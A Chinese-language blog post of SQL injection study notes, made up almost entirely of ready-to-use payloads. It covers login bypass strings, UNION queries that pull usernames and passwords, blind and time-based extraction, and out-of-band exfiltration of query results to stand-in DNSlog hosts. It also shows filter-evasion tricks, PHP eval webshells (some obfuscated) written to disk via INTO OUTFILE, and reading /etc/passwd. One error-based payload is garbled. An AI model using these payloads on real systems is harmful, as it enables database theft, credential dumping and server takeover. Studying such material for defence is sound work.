---
layout: post
title: SQL注入
---
   
SQL注入学习笔记   
  
# SQL注入

**一般存在位置**  
数据交互或查询的地方

## 0x01 直接注入
xxx'+or+1=1--  
万能密码
admin'--

## 0x02 union联合查询
使用union可以拼接查询语句  
' union select username,password from users--  

>如果只能输出一行，让前面的查询为假来输出  
and 1=2 union select password from users--

**使用要求**：  
1. 每个请求返回列数相同
2. 数据类型要兼容每个请求

查询原始请求返回列数方法：  
1. ' order by 1  
   ' order by 2  
   ' order by 3  
   etc  
   这个语句不用知道列名，数字代表的是第几列，超过列数最大值时将报错
2. ' UNION SELECT NULL--  
   ' UNION SELECT NULL,NULL--  
   ' UNION SELECT NULL,NULL,NULL--  
   etc  
   NULL数量不对将报错，用NULL来测能保证数据类型兼容原始语句和注入语句  
>*注*:  
>1. 在Oracle数据库中，查询语句必须有select来指定数据库，可以利用内建表 **DUAL** 来绕过，例： ' UNION SELECT NULL FROM DUAL--    
>2. 在 MySQL中 --注释前必须加一个空格，或者用#也可以注释

### union找数据类型为字符串的列
猜出列数后，可以找数据类型为字符串的列  
用这样的语句,查看列是否为字符串:  
' UNION SELECT 'a',NULL,NULL,NULL--  
' UNION SELECT NULL,'a',NULL,NULL--  
' UNION SELECT NULL,NULL,'a',NULL--  
' UNION SELECT NULL,NULL,NULL,'a'--   
当列值数据类型不兼容会导致报错，如果没发生错误，说明是列值是字符串类型，可以进一步检索。

### union注入攻击检索感兴趣的数据
当确定了原始查询的返回列列数和哪一列可以兼容字符串时，我们就可以从这个位置检索感兴趣的数据。
假设：

>原始查询返回两列，每一列都兼容字符串类型  
>注入点是 WHERE 子句中带引号的字符串  
>数据库中存在一个包含 username 和 password 字段的 users 表  
>这种情况下，我们可以提交如下 payload 从 users 表中获取内容：  

' UNION SELECT username, password FROM users--

执行此攻击所需的关键信息是存在一个名为 users 的表，该表有两列，分别名为 username 和 password。
没有这些信息，我们需要猜表名和列名。
实际上，所有现代数据库都提供数据库结构查询方法，确定数据库包含哪些表和列的方法。比如MySQL5.0以上的information-schema表  

## 0X03 猜表名列名
### 1.猜表名
````sql
' and (select count(*) from 表名)!=0--        --!=也可以替换成<>0  
' and exists select * from 表名  
' and 表名.已知的列名 is NULL --              --当前表名需要先知道列名  
````
### 2.猜列名
````sql
' and column is NULL --                      --猜当前列名    
' and (select count(列名) from 表名)<>0  
' and exist (select 列名 from 表名)  
````
### 3.猜值长度
' and select top 1 len(已知的列名) from 表名 <5   
//猜长度小于5 top 1返回1条结果 Mysql是limit 1  
### 4.知道长度后猜具体内容
````sql
' and select top 1 ord(mid(列名,开始位置,1)) from admin > ascii码  
# mid(column_name,start[,length])用于提取字符 ord()返回第一个字符的ascii值
#截取字符串还可以使用substr(string,start,length)和substring() //oracle中没有mid()
#从左截取可以使用left(string,length)
#ord是mysql中的 其他的可以用ascii() access中用asc()
````

## 0x04 从单列中返回多列值
方法是拼接，把多个值拼接在一起可以从单列中返回多列的值，理想情况下，还可以通过分隔符来区分拼接的多个值。  

>例如，在 Oracle 中可以提交如下的 payload：  
' UNION SELECT username || '~' || password FROM users--   
'||' 是 Oracle 中的字符串连接运算符。注入查询将 username 和 password 连接在一起，通过 '~' 符号做分隔符。  
返回值：  
...  
administrator~s3cure  
wiener~peter  
carlos~montoya  
...   

>mysql中有concat()函数，可以连接字符串  
>concat(str1,separator,str2,separator,…)  可以没有分隔符  
>concat_ws(separator, str1, str2, …)   可以一次指定分隔符用"",单分隔符不能为NULL  
>group_concat(\[distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator ‘分隔符’])  
>group_concat()将group by产生的同一个分组中的值连接起来，返回一个字符串结果distinct可以排除重复值

**不同数据库语句各有不同** 详情见不同数据库备忘单

## 0x05 获取数据库信息
### 1.查询数据库类型和版本
|Database type|Query|
|----|----|
|Microsoft, MySQL|SELECT @@version|
|Oracle|SELECT * FROM v$version|
|PostgreSQL|SELECT version()|
可以使用union查询这部分信息，例：  
' union select @@version --
' union select banner from v$version--

**除此之外还可以根据数据库之间的差异特征判断**
#### 1.1 根据报错内容判断
例:
>Microsoft JET Database Engine是access
>ODBC SQL Server是MSSSQL
#### 1.2 基于特定函数的判断
例：
>len和length  
>在mssql等，是len()函数,mysql中使用length()  
>substring和substr  
>等
#### 1.3 基于符号判断
例：
````
oracle不支持/* */注释
mysql可以#注释
oracle和mysql都不支持用;多行查询
连接符也都不同
````
#### 1.4 基于特殊表判断
````
oracle有sys.user_tables表 (而且语句必须有from，常用的dual）
MSSQL有sysobjects表
access有msysobjects表
mysql>5.0有information_schema表
````
### 2.列出数据库内容
现代数据库都以一个内建表来存数据库的表名列明等信息information_schema oracle中叫all_tables
利用information_schema查看表名
````sql
#mysql等
SELECT * FROM information_schema.tables      --查看全部表信息

select table_name from information_schema.tables where table_schema='库名'                         --查看指定库中表

SELECT * FROM information_schema.columns WHERE table_name = '列名'  --查看列信息

select column_name from information_schema.columns where table_schema='库名' and table_name='表名'   --查看列

````
````sql
--oracle
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = '表名'
````
````sql
--根据列中的名字select,例如
' union select username, password from users--
````
## 0x06 盲注
盲注指存在可利用漏洞，但没有返回错误信息的注入。没有报错信息的话上面的注入方法就很难判断，但盲注的语句同样执行，也可以利用，但需要用别的方式。
### 1.通过触发响应进行盲注
页面虽然不会返回报错，但会返回某些字符或样式提示语句是否被成功执行。形成布尔型盲注，就是真假判断，有返回就说明语句被成功执行，无返回说明执行失败。
假设web应用会对cookie使用sql查询语句，如：  
````sql
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4

SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
````
这里存在注入但不会向用户回显结果，可是根据输入不同页面会有所改变，当语句取回数据时会回显一个“Welcome back”在界面上。

这样一次就可以判断1bit数据，可以用上面的判断列名方式，使用二分发判断字母，例如  
````sql
xyx' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 'm'--
````
返回真，说明第一个字母在m之后，再测
````sql
xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 't'--
````
这样测下去，最终测到=s时返回真，说明第一个字母是s
````sql
xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) = 's'--
````
**可以用猜内容中ascii码的方式来判断，其余盲注同理**
### 2.通过触发sql错误进行盲注
如果应用执行了SQL语句，但返回结果却永远相同，没有了布尔型的判断条件，
这种情况下，可以根据注入语句来触发错误条件，让页面你返回信息  
如果注入语句为真，就触发一个数据库错误，如果没执行就不触发。通常，引发一个未被处理的错误将会导致页面发生变化，这样就可以判断注入语句是否被执行。  
利用case when then语句(每个数据库不一样，详情见不同数据库备忘录) 例：
````
xyz' UNION SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--
#返回空
xyz' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END--
#返回除以0的错误
````
然后同样利用布尔型盲注，例：
````sql
xyz' union select case when (username = 'Administrator' and SUBSTRING(password, 1, 1) > 'm') then to_char(1/0) to_char(else null end from users--
````

### 3.时间盲注
我们前面注入是通过返回的不同来判断的，如果错误全被处理了，就不会有报错，这样页面就不会有任何不同。  
这种时候可以通过添加延时指令来判断注入语句是否执行，(每个数据库延时方法不同)例：
````
'; IF (1=2) WAITFOR DELAY '0:0:10'--
#不会产生延时
'; IF (1=1) WAITFOR DELAY '0:0:10'--
#会产生延时
````
然后同理每个字符判断：
````sql
'; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
````
**注：时间盲注需要用单线程爆破**

### 4.带外数据盲注
带外数据是指通过其他的通道来回显数据，就是利用其他协议或者渠道，如http请求、DNS解析、SMB服务等将数据带出，通过能否成功带出来判断真假，当上面所有方法都不能能用了，可以尝试带外数据的方式注入。  
例使用DNS协议，大多时候DNS查询请求都不会被阻止，可以利用DNSlog来判断  
[ceye.io](http://ceye.io/) [dnslog.cn](http://www.dnslog.cn)等  
**注：一般需要高权限，mysql中只能用在windows平台，语句详情见不同数据库备忘录**
例;
````sql
#mysql
select load_file('\\\\XXX.xxxx.ceye.io\\aaa')
````
用带外方法把数据带出
例：
````sql
#mysql
' and if((select load_file(concat('\\\\',(select database()),'.xxxx.ceye.io\\abc'))),1,0)-- 
````
也可以用request方式请求：
#### oracle中利用utl_http.request带外注入
````
# 测试有没有utl_http.request权限
'and exists (select count(*) from all_objects where object_name='UTL_HTTP') --

反弹注入语句用法
' and utl_http.request('http://xxx.xxx:xxx/'||(select banner from sys.v_$version where rownum=1))=1--
````
````
查看当前连接用户
' and utl_http.request('http://xxx.xxx:xxx/'%7C%7C(select SYS_CONTEXT ('USERENV', 'CURRENT_USER')from dual))=1 --

查询系统用户
%27%20and%20utl_http.request('http://xxx.xxx:xxx/'%7c%7c (select user from dual))=1--

%27%20and%20utl_http.request('http://xxx.xxx:xxx/'%7c%7c(select member from v$logfile where rownum=1))=1--

%27%20and%20%20utl_http.request(%27http://xxx.xxx:xxx/%27%7c%7c(select%20instance_name%20from%20v$instance))=1--

查询admin的帐号和密码
' and utl_http.request('http://xxx.xxx:xxx/'||(select username||password from admin))=1 --
````
>utl_inaddr.get_host_address()函数和 SYS.DBMS_LDAP.INIT()函数也有类似效果
````
' and (select utl_inaddr.get_host_address((select user from dual)||'.xxx.ceye.io') from dual)is not null --

' and (select SYS.DBMS_LDAP.INIT((select user from dual)||'.xxx.ceye.io') from dual)is not null --
````

## 0x07 不同数据库备忘单
### 1.字符串连接
将多个字符串拼接在一起，返回一个新的字符串。
|||
|-----------|--------------|
|Oracle     |'foo'\|\|'bar'|
|Microsoft	|'foo'+'bar'|
|PostgreSQL	|'foo'||'bar'|
|MySQL      |'foo' 'bar' \[注意中间有空格\] <br />CONCAT('foo','bar')|

### 2.字符串切割
从具有指定长度的偏移量中提取字符串的一部分。请注意，偏移索引是基于1的。以下每个表达式将返回字符串ba。
|||
| ---------- | ------------------------- |
| Oracle     | SUBSTR('foobar', 4, 2)    |
| Microsoft  | SUBSTRING('foobar', 4, 2) |
| PostgreSQL | SUBSTRING('foobar', 4, 2) |
| MySQL      | SUBSTRING('foobar', 4, 2) <br />mid(column_name,start\[,length\]) \[截取长度不填为剩余所有\]|

### 3.注释
使用注释来截断查询并删除原始输入之后的查询部分。
|||
| ---------- | ----------------------|
| Oracle     | --comment             |
| Microsoft  | --comment /\*comment*/ |
| PostgreSQL | --comment /\*comment*/ |
| MySQL      | #comment <br />-- comment \[注意双破折号后的空格\] <br />/\*comment\*/ |

### 4.数据库版本
查询数据库确定其类型和版本。
|||
|-|-|
| Oracle     | SELECT banner FROM v\$version <br /> SELECT version FROM v\$instance |
| Microsoft  | SELECT @@version |
| PostgreSQL | SELECT version() |
| MySQL      | SELECT @@version |

### 5.数据库内容
列出数据库中存在的表，以及这些表中所包含的列。
|||
|-|-|
| Oracle    | SELECT * FROM all_tables <br />SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE' |
| Microsoft | SELECT * FROM information_schema.tables <br /> SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' |
| PostgreSQL| SELECT * FROM information_schema.tables <br /> SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' |
| MySQL     | SELECT * FROM information_schema.tables <br /> SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' |

###  6.条件错误
测试单个布尔条件，如果条件为true，则触发数据库错误。
|||
|-|-|
| Oracle     | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual |
| Microsoft  | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END |
| PostgreSQL | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END |
| MySQL      | SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') |

###  7.批量查询
使用批量查询来连续执行多个数据库语句。 注意，在执行后续查询时，结果不会直接返回给应用程序。 因此，该技术主要用于与sql盲注漏洞有关的问题，在该漏洞中，可以使用二次查询来触发DNS查询，条件错误或时间延迟。
|||
|-|-|
| Oracle     | Does not support batched queries. |
| Microsoft  | QUERY-1-HERE; QUERY-2-HERE        |
| PostgreSQL | QUERY-1-HERE; QUERY-2-HERE        |
| MySQL      | Does not support batched queries. |

### 8.时间延迟
处理sql查询时，可能导致数据库中的时间延迟。 以下情况将导致10秒的无条件时间延迟。
|||
|-|-|
| Oracle     | dbms_pipe.receive_message(('a'),10) |
| Microsoft  | WAITFOR DELAY '0:0:10'              |
| PostgreSQL | SELECT pg_sleep(10)                 |
| MySQL      | SELECT sleep(10)                    |

### 9.有条件的时间延迟
可以测试单个布尔条件，并在条件为真时触发时间延迟。
````
#Oracle
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual

#Microsoft   
IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'

#PostgreSQL 
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END

#mysql
SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')
````

### 10.DNS查询
可以利用查询语句使数据库对外部域执行DNS查询。 
````
#Oracle
以下技术利用了XML外部实体注入，可能已被修复: 
SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://xxx.ceye.io/"> %remote;]>'),'/l') FROM dual

下面这句适用于完全修补的Oracle，但需要管理员权限: 
SELECT UTL_INADDR.get_host_address('xxx.ceye.io')/

#Microsoft
exec master..xp_dirtree '//xxx.ceye.io/a'

#PostgreSQL
copy (SELECT '') to program 'nslookup xxx.ceye.io'

#MySQL
以下技术仅适用于Windows: 
LOAD_FILE('\\\\xxx.ceye.io\\a') 
SELECT ... INTO OUTFILE '\\\\xxx.ceye.io\a
````

### 11.DNS查找与数据渗透
可以使数据库对包含注入查询结果的外部域执行DNS查找。然后轮询服务器以检索任何DNS交互的详细信息，包括被泄露的数据。
````
#Oracle
SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|\|(SELECT YOUR-QUERY-HERE)\|\|'.xxx.ceye.io/"> %remote;]>'),'/l') FROM dual

#Microsoft
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.xxx.ceye.io/a"')

#PostgreSQL
create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into p (SELECT YOUR-QUERY-HERE); c := 'copy (SELECT '''') to program ''nslookup '||p||'.xxx.ceye.io'''; execute c; END; $$ language plpgsql security definer; SELECT f();

#MySQL
The following technique works on Windows only: SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\xxx.ceye.io\a'
````

## 0x08 绕过
````
#拼接'
' or '1'='1       //注释符被过滤

#大小写变换
SeleCT

#套娃
selselectect

#编码
%53%45%4c%45%43%54      //SELECT

#使用sql注释绕过
select/**/username,password/**/from/**/user--   //如果空格被过滤了，可以用来代替空格

sele/**/ct username fr/**/om user--    //mysql中甚至可以用来隔开字符

#拼接字符
'adm'||'in'
'adm'+'in'
concat('adm','in')

#字符替换
可以用各种字符转化函数
CHR（ascii码转化）
REVERSE（字符串反转）
TRANSLATE（高级的字符串替换）
REPLACE
SUBSTR

甚至可以建立一个十六进制的编码的字符串，通过exec来执行，例exec('select * from user')可以变成
declear @q varchar(5000); select @q=0x73 65 6C 65 63 74 20 2A 20 66 72 6F 6D 20 75 73 65 72 ,exec(@q) 

#宽字节注入
编码方式不同构造双字节让'逃逸
'被转义后\'=%5c%27
但gbk为双字节，可以输入其他字符与%5c结合，让%27逃逸
比如输入
%d5%27            //%d5%5c是汉字 诚
编码后
%d5%5c%27
%d5%5c被结合=诚'
不一定是%d5
0×81-0xFE开头+0×5C的字符应该都可以
````

## 0x09 注入利用
### 1.写马 
需要高权限+知道绝对路径
````
select '<?php eval($_POST[cmd])?>' into outfile '物理路径'

#16进制版
select 0x3C3F706870206576616C28245F504F53545B27636D64275D293B3F3E into outfile '绝对路径' from xxx

#mysql中通过写到表中来拼接语句
创建一个表
CREATE TABLE a (cmd text NOT NULL);
插入数据
INSERT INTO a (cmd) VALUES('<?php eval($_POST['password']);?>');
导出一句话
SELECT cmd from a into outfile '/var/www/tmp/xxx.php';
删除表
Drop TABLE IF EXISTS a;
````
````
<?php @($_=base64_decode($_POST[1])),$_(hex2bin($_POST[2]))?>

<?php if(isset($_REQUEST['error'])&&isset($_REQUEST['limit'])){
    $page = $_REQUEST['error'];
    $limit = $_REQUEST['limit'];
    $func = base64_decode(str_rot13(strrev($limit)));
    $func(base64_decode(str_rot13(strrev($page))));
    exit;
````
### 2.文件读取
需要高权限
````
select load_file('绝对路径')

#读取/etc/passwd并用空格替换<
replace(load_file(0×2F6574632F706173737764),0×3c,0×20) 

replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))
````

## 0x10 常用命令
### 1.oracle常用命令
````
1 当前用户权限 （select * from session_roles）
2 当前数据库版本 （ select banner from sys.v_$version where rownum=1）
3 服务器出口IP （用utl_http.request 可以实现）
4 服务器监听IP （select utl_inaddr.get_host_address from dual）
5 服务器操作系统 （select member from v$logfile where rownum=1）
6 服务器sid ( 远程连接的话需要， select instance_name fromv$instance;）
7 当前连接用户 （select SYS_CONTEXT ('USERENV', 'CURRENT_USER')from dual）
````
